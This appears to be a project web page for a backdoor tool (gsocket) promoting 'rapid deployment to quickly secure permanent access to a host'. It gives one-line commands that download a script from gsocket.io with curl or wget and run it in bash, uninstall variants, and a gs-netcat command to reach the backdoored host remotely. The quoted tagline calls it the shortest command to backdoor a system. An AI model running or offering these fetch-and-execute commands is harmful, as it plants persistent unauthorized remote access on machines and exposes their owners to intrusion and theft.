---
layout: default
---

Rapid deployment to quickly secure permanent access to a host.

> _This must be the shortest single-line command to backdoor a system_
>                                                 -- anonymous

Use either of these two commands to _deploy_:
```shell
bash -c "$(curl -fsSL gsocket.io/x)"
```

```shell
bash -c "$(wget -qO- gsocket.io/x)"
```

Use either of these two commands to _uninstall_:
```shell
GS_UNDO=1 bash -c "$(curl -fsSL gsocket.io/x)"
```
```shell
GS_UNDO=1 bash -c "$(wget -qO- gsocket.io/x)"
```

Access the remote host from anywhere else in the word:
```shell
$ gs-netcat -s ExampleSecretChagneMe -i
```
---
{:refdef: style="text-align: center;"}
EXAMPLE
{: refdef}
Install
{:refdef: style="text-align: center;"}
![Deploy-Example](../assets/images/deploy-example.png)
{: refdef}
Login
{:refdef: style="text-align: center;"}
![Deploy-Login](../assets/images/deploy-login.png)
{: refdef}
---
Check out our [GitHub Page](https://github.com/hackerschoice/gsocket) for more fun.  

Get Involved. We are looking for volunteers to work on the website and a logo and to discuss new ideas. [Join us on telegram](https://t.me/thcorg).

